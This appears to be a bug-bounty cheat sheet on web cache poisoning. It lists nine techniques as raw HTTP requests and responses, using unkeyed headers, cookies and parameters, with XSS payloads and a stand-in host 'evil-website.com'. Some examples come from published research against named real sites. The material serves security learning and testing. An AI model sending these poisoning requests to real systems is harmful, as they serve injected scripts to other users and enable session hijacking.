# Web Cache Poisoning

## Introduction
The objective of web cache poisoning is to send a request that causes a harmful response that gets saved in the cache and served to other users.

## Where to find
* Parameter with Cache (unkeyed) and its value reflected in Response   
* Header with Cache (unkeyed) and its value reflected in Response   
* Cookie with Cache (unkeyed) and its value reflected in Response   

## Impact
* Session Hijacking (Web Cache Poisoning + [Host Header Injection](https://github.com/Ch4ng3TheW0rld/AllAboutBugBounty/blob/master/Host%20Header%20Injection.md) + [XSS](https://github.com/Ch4ng3TheW0rld/AllAboutBugBounty/blob/master/Cross%20Site%20Scripting.md))
* Password Steal (Web Cache Poisoning + [Host Header Injection](https://github.com/Ch4ng3TheW0rld/AllAboutBugBounty/blob/master/Host%20Header%20Injection.md))
* Session Hijacking (Web Cache Poisoning + Parameter + [XSS](https://github.com/Ch4ng3TheW0rld/AllAboutBugBounty/blob/master/Cross%20Site%20Scripting.md))
* Session Hijacking (Web Cache Poisoning + Http Parameter Pollution + [XSS](https://github.com/Ch4ng3TheW0rld/AllAboutBugBounty/blob/master/Cross%20Site%20Scripting.md))

## How to exploit
Note: Cache-Control: public, no-cache or X-cache: miss, hit
1. Basic Header poisoning
```
GET / HTTP/1.1
Host: www.vuln.com
X-Forwarded-Host: evil-website.com

### Response:
HTTP/1.1 200 OK
Cache-Control: public, no-cache
…
<img href="https://evil-website.com/a.png" />
```
> Or you can input XSS payloads
```
GET / HTTP/1.1
Host: www.vuln.com
X-Forwarded-Host: a.\"><script>alert(1)</script>

### Response:
HTTP/1.1 200 OK
Cache-Control: public, no-cache
…
<img href="https://a.\"><script>alert(1)</script>a.png" />
```

2. Basic Cookie poisoning
```
GET / HTTP/1.1
Host: www.vuln.com
Cookie: sid=a.\"><script>alert(1)</script>

### Response:
HTTP/1.1 200 OK
X-Cache: miss, hit
…
<img href="https://a.\"><script>alert(1)</script>a.png" />
```

3. Multiple Header poisoning
```
GET / HTTP/1.1
Host: www.vuln.com
X-Forwarded-Host: evil-website.com
X-Forwarded-Scheme: nothttps

### Response:
HTTP/1.1 301 Moved Permanently
Location: https://evil-website.com/
```

4. User-agent Selective poisoning (unknown header)
```
GET / HTTP/1.1
Host: www.vuln.com
User-Agent: Mozilla/5.0 (<snip> Firefox/60.0)
X-Forwarded-Host: a"><iframe onload=alert(1)>

### Response:
HTTP/1.1 200 OK
X-Served-By: cache-lhr6335-LHR
Vary: User-Agent, Accept-Encoding
…
<link rel="canonical" href="https://a">a<iframe onload=alert(1)>
```

5. query parameter poisoning
```
GET /?utm_content='/><script>alert(1)</script> HTTP/1.1
Host: www.vuln.com

### Response:
HTTP/1.1 200 OK
X-Cache: miss, hit
…
<href="https://www.vuln.com/?utm_content='/><script>alert(1)</script>">
```

6.Parameter cloaking (Web Cache Poisoning + Http Parameter Pollution)
```
GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)
Host: www.vuln.com

### Response:
HTTP/1.1 200 OK
X-Cache-Key: /js/geolocate.js?callback=setCountryCookie
…
alert(1)({"country" : "United Kingdom"})
```

7.fat GET request
```
GET /js/geolocate.js?callback=setCountryCookie
…
callback=alert(1)

### Response:
HTTP/1.1 200 OK
X-Cache-Key: /js/geolocate.js?callback=setCountryCookie
…
alert(1)({"country" : "United Kingdom"})
```

8. Route Poisoning
```
GET / HTTP/1.1
Host: www.goodhire.com
X-Forwarded-Server: evil

### Response:
HTTP/1.1 404 Not Found
CF-Cache-Status: MISS
...
<title>HubSpot - Page not found</title>
<p>The domain canary does not exist in our system.</p>
```
To exploit this, we need to go to hubspot.com, register ourselves as a HubSpot client, place a payload on our HubSpot page, and then finally trick HubSpot into serving this response on goodhire.com
```
GET / HTTP/1.1
Host: www.goodhire.com
X-Forwarded-Host: portswigger-labs-4223616.hs-sites.com

### Response:
HTTP/1.1 200 OK
…
<script>alert(document.domain)</script>
```

9. Hidden Route Poisoning
```
GET / HTTP/1.1
Host: blog.cloudflare.com
X-Forwarded-Host: evil

### Response:
HTTP/1.1 302 Found
Location: https://ghost.org/fail/
```
When a user first registers a blog with Ghost, it issues them with a unique subdomain under ghost.io. Once a blog is up and running, the user can define an arbitrary custom domain like blog.cloudflare.com. If a user has defined a custom domain, their ghost.io subdomain will simply redirect to it:
```
GET / HTTP/1.1
Host: blog.cloudflare.com
X-Forwarded-Host: noshandnibble.ghost.io

### Response:
HTTP/1.1 302 Found
Location: http://noshandnibble.blog/
```

## References
* [Portswigger](https://portswigger.net/research/practical-web-cache-poisoning)
